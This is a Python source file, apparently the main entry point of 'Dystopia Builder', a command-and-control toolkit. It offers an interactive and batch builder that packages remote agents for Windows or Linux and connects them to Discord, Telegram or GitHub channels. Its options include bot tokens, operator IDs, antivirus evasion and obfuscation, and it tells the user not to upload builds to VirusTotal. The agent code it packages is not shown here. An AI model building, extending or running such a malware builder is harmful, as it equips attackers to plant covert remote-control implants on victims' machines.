#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Dystopia Builder — single entry point (interactive REPL + --env/--batch)."""

from __future__ import annotations

import argparse
import os
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parent
os.chdir(ROOT)
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

VERSION = "3.0"
BANNER = f"""
╔══════════════════════════════════════════════════╗
║  Dystopia Builder {VERSION} · TarzEH                 ║
║  Discord / Telegram / GitHub · Win + Linux       ║
╚══════════════════════════════════════════════════╝
""".strip()

DEFAULT_ENV = Path(os.environ.get("DYSTOPIA_ENV", "/etc/dystopia/discord.env"))


def _pretty_table():
    from prettytable import PrettyTable  # lazy: allows --help without venv deps
    return PrettyTable


def _build_api():
    from libraries.build_api import build_discord_agent
    return build_discord_agent


# ---------------------------------------------------------------------------
# State
# ---------------------------------------------------------------------------

settings = ["None", "None", "None", "None", "None"]  # name, guild/user/gh, token/repo, channel, webhook
target = "windows"
pack = "auto"
evasion = "true"
obfuscate = "true"
operator_ids = ""
payload = ""


def _truthy(value: str | None, default: bool = False) -> bool:
    if value is None or value == "":
        return default
    return str(value).lower() in ("true", "1", "yes", "on")


def _mask_secret(value: str, keep: int = 4) -> str:
    if not value or value in ("None", "none", ""):
        return value or "None"
    s = str(value)
    if len(s) <= keep:
        return "*" * len(s)
    return f"{'*' * max(8, len(s) - keep)}{s[-keep:]}"


def clear_screen() -> None:
    if sys.platform.startswith("linux") or sys.platform == "darwin":
        os.system("clear")
    elif sys.platform.startswith("win"):
        os.system("cls")


def prompt() -> str:
    ch = payload or "-"
    return f"dystopia ({ch}/{target}) > "


def options_table() -> PrettyTable:
    table = _pretty_table()(["Option", "Value"])
    table.align["Option"] = "l"
    table.align["Value"] = "l"
    table.add_row(["target", target])
    table.add_row(["pack", pack])
    table.add_row(["obfuscate", obfuscate])
    table.add_row(["evasion", evasion])
    table.add_row(["name", settings[0]])
    if payload == "discord":
        table.add_row(["guild-id", settings[1]])
        table.add_row(["bot-token", _mask_secret(settings[2])])
        table.add_row(["channel-id", settings[3]])
        table.add_row(["webhook", _mask_secret(settings[4])])
        table.add_row(["operator-ids", operator_ids or "(required)"])
    elif payload == "telegram":
        table.add_row(["user-id", settings[1]])
        table.add_row(["bot-token", _mask_secret(settings[2])])
    elif payload == "github":
        table.add_row(["github-token", _mask_secret(settings[1])])
        table.add_row(["github-repo", settings[2]])
    else:
        table.add_row(["payload", "(none — run: use discord)"])
    return table


def print_help(topic: str | None = None) -> None:
    if topic is None:
        print(
            """
Commands:
  use <payload>              discord | telegram | github
  set <opt> <value>          configure build options
  options | config           show current settings (secrets masked)
  build                      confirm + package agent
  clear                      clear screen
  help [cmd]                 this help / topic help
  exit | quit                leave builder

Quick start:
  use discord
  set target linux
  set name lab-agent
  set guild-id <id>
  set bot-token <token>
  set channel-id <id>
  set operator-ids <user-id>
  options
  build

Batch / automation:
  python builder.py --env /etc/dystopia/discord.env
  python builder.py --batch          # reads DYSTOPIA_ENV or /etc/dystopia/discord.env
""".rstrip()
        )
        return

    topic = topic.lower()
    if topic == "use":
        print("  use discord | telegram | github")
        print("  Discord is the primary path (Win + Linux, obfuscation).")
    elif topic == "set":
        print(
            """
  set name <str>             output / agent name
  set target windows|linux
  set pack auto|exe|script|onefile
  set obfuscate true|false   default true (AES secrets in payload)
  set evasion true|false
  set lab-mode true|false    alias: evasion off/on
  Discord: guild-id, bot-token, channel-id, webhook, operator-ids
  Telegram: bot-token, user-id
  GitHub:   github-token, github-repo
""".rstrip()
        )
    elif topic in ("options", "config"):
        print("  options | config — print settings table (token/webhook masked).")
    elif topic == "build":
        print("  build — print masked summary, confirm, then package via build_api.")
    else:
        print(f"[!] No help for {topic!r}")


def confirm_summary() -> None:
    print("\n── Build summary ──────────────────────────────")
    print(f"  payload     : {payload}")
    print(f"  target/pack : {target} / {pack}")
    print(f"  name        : {settings[0]}")
    print(f"  obfuscate   : {obfuscate}")
    print(f"  evasion     : {evasion}")
    if payload == "discord":
        print(f"  guild-id    : {settings[1]}")
        print(f"  bot-token   : {_mask_secret(settings[2])}")
        print(f"  channel-id  : {settings[3]}")
        print(f"  webhook     : {_mask_secret(settings[4])}")
        print(f"  operator-ids: {operator_ids or '(missing)'}")
    elif payload == "telegram":
        print(f"  user-id     : {settings[1]}")
        print(f"  bot-token   : {_mask_secret(settings[2])}")
    elif payload == "github":
        print(f"  github-token: {_mask_secret(settings[1])}")
        print(f"  github-repo : {settings[2]}")
    if obfuscate == "false":
        print("  !! WARN: obfuscate=false embeds PLAINTEXT secrets (debug only)")
    print("───────────────────────────────────────────────\n")


def do_build(*, auto_confirm: bool = False) -> int:
    if not payload:
        print("[!] Select a payload first: use discord")
        return 1
    if settings[0] in ("", "None"):
        print("[!] set name <agent-name> first")
        return 1
    if not auto_confirm:
        confirm_summary()
        ans = input("[?] Proceed with build? [y/N] ").strip().lower()
        if ans not in ("y", "yes"):
            print("[*] Aborted.")
            return 0
    else:
        confirm_summary()

    if obfuscate == "false":
        print(
            "[!] WARNING: obfuscate=false — secrets will be PLAINTEXT in the agent "
            "(debug only)."
        )

    print("[*] Building...")
    try:
        if payload == "discord":
            out = _build_api()(
                name=settings[0],
                target=target,
                pack=pack,
                evasion=evasion,
                guild=str(settings[1]),
                token=str(settings[2]),
                channel=str(settings[3]),
                webhook=str(settings[4]),
                operator_ids=operator_ids,
                obfuscate=_truthy(obfuscate, default=True),
            )
            print(f"[+] Build OK → {out}")
            print("[*] Treat dist/ as secret. Do not upload to VirusTotal.")
            return 0

        if payload == "telegram":
            if target == "linux":
                print("[!] Linux target is Discord-only for now")
                return 1
            from libraries.build_api import apply_common_replacements

            path = ROOT / "code" / "telegram" / "main.py"
            newfile = path.read_text(encoding="utf-8")
            newfile = newfile.replace("{BOT_TOKEN}", str(settings[2]))
            newfile = newfile.replace("{USER_ID}", str(settings[1]))
            newfile = apply_common_replacements(newfile, evasion)
            out_py = Path(settings[0] + ".py")
            out_py.write_text(newfile, encoding="utf-8")
            print(f"[+] Wrote {out_py} (legacy Telegram path — no obfuscation)")
            print("[!] Prefer Discord with obfuscate=true")
            return 0

        if payload == "github":
            if target == "linux":
                print("[!] Linux target is Discord-only for now")
                return 1
            from libraries.build_api import apply_common_replacements

            path = ROOT / "code" / "github" / "main.py"
            newfile = path.read_text(encoding="utf-8")
            newfile = newfile.replace("{TOKEN}", str(settings[1]))
            newfile = newfile.replace("{REPO}", str(settings[2]))
            newfile = apply_common_replacements(newfile, evasion)
            out_py = Path(settings[0] + ".py")
            out_py.write_text(newfile, encoding="utf-8")
            print(f"[+] Wrote {out_py} (legacy GitHub path — no obfuscation)")
            return 0

        print("[!] Unknown payload")
        return 1
    except Exception as exc:
        print(f"[!] Build failed: {exc}")
        return 1


def cmd_set(key: str, value: str) -> None:
    global target, pack, evasion, obfuscate, operator_ids
    key = key.lower()

    if key == "name":
        settings[0] = value
    elif key == "guild-id":
        settings[1] = value
    elif key == "bot-token":
        settings[2] = value
        print(f"[+] bot-token = {_mask_secret(value)}")
        return
    elif key == "channel-id":
        settings[3] = value
    elif key == "user-id":
        settings[1] = value
    elif key == "github-token":
        settings[1] = value
        print(f"[+] github-token = {_mask_secret(value)}")
        return
    elif key == "github-repo":
        settings[2] = value
    elif key == "webhook":
        settings[4] = value
        print(f"[+] webhook = {_mask_secret(value)}")
        return
    elif key == "operator-ids":
        operator_ids = value
    elif key == "target":
        v = value.lower()
        if v in ("windows", "win", "exe"):
            target = "windows"
        elif v in ("linux", "lin", "elf"):
            target = "linux"
            if evasion == "true":
                print("[*] Tip: set evasion false (or lab-mode true) for lab/VPS.")
        else:
            print("[!] target must be windows|linux")
            return
    elif key == "pack":
        v = value.lower()
        if v in ("auto", "exe", "script", "onefile"):
            pack = v
        else:
            print("[!] pack must be auto|exe|script|onefile")
            return
    elif key == "evasion":
        if value.lower() in ("true", "false", "1", "0", "yes", "no", "on", "off"):
            evasion = "true" if _truthy(value) else "false"
        else:
            print("[!] evasion must be true|false")
            return
    elif key == "obfuscate":
        if value.lower() in ("true", "false", "1", "0", "yes", "no", "on", "off"):
            obfuscate = "true" if _truthy(value) else "false"
            if obfuscate == "false":
                print(
                    "[!] WARNING: obfuscate=false embeds PLAINTEXT secrets "
                    "in the agent (debug only)."
                )
        else:
            print("[!] obfuscate must be true|false")
            return
    elif key == "lab-mode":
        if _truthy(value):
            evasion = "false"
            print("[+] lab-mode → evasion=false")
            return
        evasion = "true"
        print("[+] lab-mode off → evasion=true")
        return
    else:
        print("[!] Unknown option. Try: help set")
        return

    # Generic echo (non-secret keys already returned above)
    display = {
        "name": settings[0],
        "guild-id": settings[1],
        "channel-id": settings[3],
        "user-id": settings[1],
        "github-repo": settings[2],
        "operator-ids": operator_ids,
        "target": target,
        "pack": pack,
        "evasion": evasion,
        "obfuscate": obfuscate,
    }.get(key, value)
    print(f"[+] {key} = {display}")


def load_env_file(path: Path) -> dict:
    data: dict[str, str] = {}
    for line in path.read_text(encoding="utf-8").splitlines():
        line = line.strip()
        if not line or line.startswith("#") or "=" not in line:
            continue
        k, v = line.split("=", 1)
        data[k.strip()] = v.strip().strip('"').strip("'")
    return data


def apply_env(env: dict) -> None:
    """Load discord.env into builder state for batch builds."""
    global payload, target, pack, evasion, obfuscate, operator_ids
    payload = "discord"
    token = env.get("DISCORD_BOT_TOKEN") or env.get("BOT_TOKEN")
    guild = env.get("DISCORD_GUILD_ID") or env.get("GUILD_ID")
    channel = env.get("DISCORD_CHANNEL_ID") or env.get("CHANNEL_ID")
    webhook = env.get("DISCORD_WEBHOOK") or env.get("WEBHOOK") or "None"
    operator_ids = (
        env.get("DISCORD_OPERATOR_IDS")
        or env.get("OPERATOR_IDS")
        or os.environ.get("DISCORD_OPERATOR_IDS")
        or ""
    )
    settings[0] = env.get("AGENT_NAME") or "linux-agent"
    settings[1] = guild or "None"
    settings[2] = token or "None"
    settings[3] = channel or "None"
    settings[4] = webhook
    tgt = (env.get("TARGET") or os.environ.get("TARGET") or "linux").lower()
    target = "windows" if tgt in ("windows", "win", "exe") else "linux"
    pack = (env.get("PACK") or os.environ.get("PACK") or ("auto" if target == "windows" else "script")).lower()
    evasion = (env.get("EVASION") or os.environ.get("EVASION") or "false").lower()
    if evasion in ("1", "yes", "on"):
        evasion = "true"
    elif evasion in ("0", "no", "off"):
        evasion = "false"
    obfuscate = "true" if _truthy(env.get("OBFUSCATE") or os.environ.get("OBFUSCATE"), default=True) else "false"


def run_batch(env_path: Path) -> int:
    if not env_path.exists():
        print(f"[!] Missing env file: {env_path}")
        print("[!] Copy discord.env.example → that path and chmod 600.")
        return 1
    env = load_env_file(env_path)
    apply_env(env)
    if settings[2] in ("None", "", "replace_me") or settings[1] in ("None", "", "replace_me"):
        print("[!] discord.env incomplete (need bot token + guild + channel)")
        return 1
    if not operator_ids or operator_ids == "replace_me":
        print("[!] operator-ids required in env (DISCORD_OPERATOR_IDS)")
        return 1
    print(f"[*] Batch build from {env_path}")
    return do_build(auto_confirm=True)


def repl() -> int:
    global payload
    print(BANNER)
    print("Type 'help' for commands. Secrets are masked in options/build.\n")
    try:
        while True:
            try:
                line = input(prompt()).strip()
            except EOFError:
                print()
                return 0
            if not line:
                continue
            parts = line.split()
            cmd = parts[0].lower()

            if cmd in ("exit", "quit"):
                print("[*] Bye.")
                return 0
            if cmd == "clear":
                clear_screen()
                print(BANNER)
                continue
            if cmd == "help":
                print_help(parts[1] if len(parts) > 1 else None)
                continue
            if cmd == "use":
                if len(parts) < 2:
                    print("[!] use discord|telegram|github")
                    continue
                choice = parts[1].lower()
                if choice not in ("discord", "telegram", "github"):
                    print("[!] Invalid payload")
                    continue
                payload = choice
                print(f"[+] Module: {choice}")
                print(options_table())
                continue
            if cmd == "set":
                if len(parts) < 3:
                    print("[!] Usage: set <option> <value>")
                    continue
                cmd_set(parts[1], " ".join(parts[2:]))
                continue
            if cmd in ("options", "config"):
                if not payload:
                    print("[!] use <payload> first")
                    continue
                print(options_table())
                continue
            if cmd == "build":
                do_build(auto_confirm=False)
                continue
            if cmd == "update":
                print(
                    "[!] 'update' disabled — this fork tracks TarzEH/dystopia-c2 only.\n"
                    "    Pull manually: git -C /opt/dystopia pull --ff-only origin main"
                )
                continue
            print(f"[!] Unknown command: {cmd!r}  (help)")
    except KeyboardInterrupt:
        print("\n[*] Bye.")
        return 0


def parse_args(argv: list[str] | None = None) -> argparse.Namespace:
    p = argparse.ArgumentParser(
        prog="builder.py",
        description=f"Dystopia Builder {VERSION} · TarzEH — interactive or batch Discord agent builder",
    )
    p.add_argument(
        "--env",
        metavar="FILE",
        help="non-interactive: load Discord settings from env file and build",
    )
    p.add_argument(
        "--batch",
        action="store_true",
        help=f"same as --env (default: {DEFAULT_ENV} or $DYSTOPIA_ENV)",
    )
    p.add_argument("--version", action="version", version=f"Dystopia Builder {VERSION} · TarzEH")
    return p.parse_args(argv)


def main(argv: list[str] | None = None) -> int:
    args = parse_args(argv)
    if args.env or args.batch:
        path = Path(args.env) if args.env else DEFAULT_ENV
        return run_batch(path)
    return repl()


if __name__ == "__main__":
    raise SystemExit(main())
